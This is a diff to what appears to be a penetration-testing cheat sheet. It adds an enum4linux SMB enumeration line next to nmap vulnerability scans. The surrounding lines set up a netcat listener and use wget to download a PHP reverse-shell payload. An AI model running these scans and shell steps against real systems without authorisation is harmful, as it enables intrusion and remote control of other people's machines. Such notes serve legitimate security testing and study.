@@ -51,6 +51,9 @@ nmap -vv -A ${VULN_HOST}
 nmap -v -A -O -oN nmap.out ${VULN_HOST}
 nmap -sV --script vuln $VULN_HOST  ## remember to experiment with other script categories
 
+# smb/samba enumeration
+enum4linux ${VULN_HOST}  ## nmap gets some data, work a check
+
 # reverse shell -- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 nc -v -n -l -p 1234
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
